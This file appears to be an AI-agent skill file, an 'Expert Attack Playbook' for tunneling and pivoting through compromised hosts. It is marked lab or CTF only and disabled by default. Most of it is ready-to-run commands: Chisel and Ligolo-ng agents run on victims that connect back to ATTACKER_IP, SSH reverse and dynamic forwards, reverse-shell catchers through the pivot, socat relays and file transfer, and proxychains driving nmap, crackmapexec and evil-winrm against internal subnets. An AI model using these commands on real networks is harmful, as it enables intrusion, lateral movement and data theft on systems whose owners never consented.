---
name: tunneling-and-pivoting
description: >-
  Tunneling and pivoting playbook. Use when establishing network tunnels through compromised hosts including SSH tunneling, Chisel, Ligolo-ng, socat, DNS/ICMP/HTTP tunneling, ProxyChains, and multi-layer pivoting strategies.
---

# SKILL: Tunneling & Pivoting — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert tunneling and pivoting techniques. Covers SSH port forwarding (local/remote/dynamic/jump), Chisel reverse SOCKS, Ligolo-ng transparent TUN pivoting, socat relays, DNS/ICMP/HTTP tunneling, ProxyChains configuration, Windows pivoting (netsh/plink), and multi-layer chaining. Pay particular attention to egress-aware tool selection and transparent routing setup.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `network-protocol-attacks` for network-level attacks from pivot positions
- `reverse-shell-techniques` for establishing initial access shells
- `unauthorized-access-common-services` for exploiting services discovered through pivots
- `linux-privilege-escalation` or `windows-privilege-escalation` after pivoting to new hosts

---

## 1. SSH TUNNELING

### Local Port Forward

Forward a local port to a remote service through the pivot.

```bash
# Access INTERNAL_HOST:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N

# Access internal web app
ssh -L 8080:10.10.10.100:80 user@PIVOT -N
# Browse: http://localhost:8080

# Bind to all interfaces (share with teammates)
ssh -L 0.0.0.0:8080:INTERNAL:80 user@PIVOT -N
```

### Remote Port Forward

Expose a local service to the pivot host's network.

```bash
# Make attacker's port 8000 accessible on pivot as pivot:9000
ssh -R 9000:127.0.0.1:8000 user@PIVOT -N

# Expose attacker's listener to internal network
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@PIVOT -N
# Internal hosts connect to PIVOT:4444 → reaches attacker:4444
```

### Dynamic Port Forward (SOCKS Proxy)

```bash
# Create SOCKS4/5 proxy on localhost:1080
ssh -D 1080 user@PIVOT -N

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET/24

# Or with browser SOCKS proxy → browse internal web apps
```

### Jump Host (ProxyJump)

```bash
# Single jump
ssh -J jumphost user@TARGET

# Multiple jumps
ssh -J jump1,jump2 user@TARGET

# SSH config for persistent jump
# ~/.ssh/config
Host internal-target
    HostName 10.10.10.100
    User admin
    ProxyJump user@jumphost.example.com
```

---

## 2. CHISEL

### Reverse SOCKS Proxy (Most Common)

```bash
# Attacker: start chisel server
chisel server --reverse --port 8080

# Victim: connect back as client, create reverse SOCKS
chisel client ATTACKER_IP:8080 R:socks

# Result: SOCKS5 proxy on attacker's 127.0.0.1:1080
proxychains nmap -sT -Pn INTERNAL/24
```

### Port Forwarding

```bash
# Forward specific port
chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306

# Multiple forwards
chisel client ATTACKER:8080 R:3306:DB:3306 R:8080:WEB:80

# Reverse port forward (expose attacker service to victim network)
chisel client ATTACKER:8080 R:0.0.0.0:4444:127.0.0.1:4444
```

---

## 3. LIGOLO-NG

TUN interface-based pivoting — transparent routing without SOCKS.

```bash
# Attacker: start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Agent (victim): connect to proxy
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo-proxy console:
>> session                    # select agent session
>> ifconfig                   # view agent's network interfaces
>> start                      # start tunnel

# Add routes on attacker to reach internal networks
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
```

### Listener (Reverse Shell Catcher Through Pivot)

```bash
# In ligolo-proxy console:
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Internal hosts connecting to AGENT:4444 → forwarded to attacker:4444
```

### Double Pivot

```bash
# Agent 1 on DMZ → tunnel to internal network 1
# Agent 2 on internal network 1 → tunnel to internal network 2
# Add routes for both networks on attacker
sudo ip route add 10.0.0.0/24 dev ligolo    # via agent 1
sudo ip route add 172.16.0.0/24 dev ligolo  # via agent 2
```

---

## 4. SOCAT

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53

# Encrypted tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80

# File transfer via socat
# Receiver:
socat TCP-LISTEN:9999,fork file:received_file,create
# Sender:
socat TCP:RECEIVER:9999 file:send_file
```

---

## 5. PROXYCHAINS / PROXIFIER

### ProxyChains Configuration

```ini
# /etc/proxychains4.conf
strict_chain          # fail if any proxy is down
# dynamic_chain       # skip dead proxies
# random_chain        # randomize proxy order

[ProxyList]
socks5 127.0.0.1 1080        # first hop (SSH dynamic forward)
socks5 127.0.0.1 1081        # second hop (if chaining)
```

```bash
# Usage
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p pass
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 6. WINDOWS PIVOTING
- 7. DNS TUNNELING
- 8. ICMP TUNNELING
- 9. HTTP TUNNELING
- 10. PIVOTING DECISION MATRIX
- 11. DECISION TREE
